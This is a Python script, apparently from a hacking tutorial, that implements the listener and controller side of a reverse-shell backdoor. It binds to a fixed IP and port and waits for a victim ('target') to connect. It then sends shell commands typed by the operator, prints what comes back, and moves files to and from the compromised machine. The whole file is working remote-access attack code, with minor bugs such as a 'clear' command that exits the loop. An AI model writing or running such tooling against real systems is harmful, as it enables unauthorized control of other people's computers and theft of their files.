#!/usr/bin/python3

import socket
import json
import os

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_receive():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            if data:
                return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    if os.path.exists(file_name):
        f = open(file_name, 'rb')
        target.send(f.read())
    else:
        print('File does not exist')

def download_file(file_name):
        f = open(file_name, 'wb')
        target.settimeout(1)
        chunk = target.recv(1024)
        while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                        break

        target.settimeout(None)
        f.close()

def target_communication():
    while True:
        command = input('* shell~%s: %s > ' % (ip[0], ip[1]))
        reliable_send(command) # will send command to device
        if command == 'quit':
            break # this will exit out the program once you use quit.
        elif command == 'clear:': #We're going to use once again the OS library and we are going to call the system command which will execute the clear command.This system function allows us to specify any command in the brackets which will then get executed inside of our terminal.Of course, since this is inside of a server code
                break
        elif command [:3] == 'cd ' : # we don't do the same so we pass through
                pass
        elif command[:8] == 'download':
                download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        else:
            result = reliable_receive() # if it wasn't we will use this line as a function to receive this response
            print(result) # print result

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('10.0.1.67',5555))
print('[+] Listening for incoming connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()
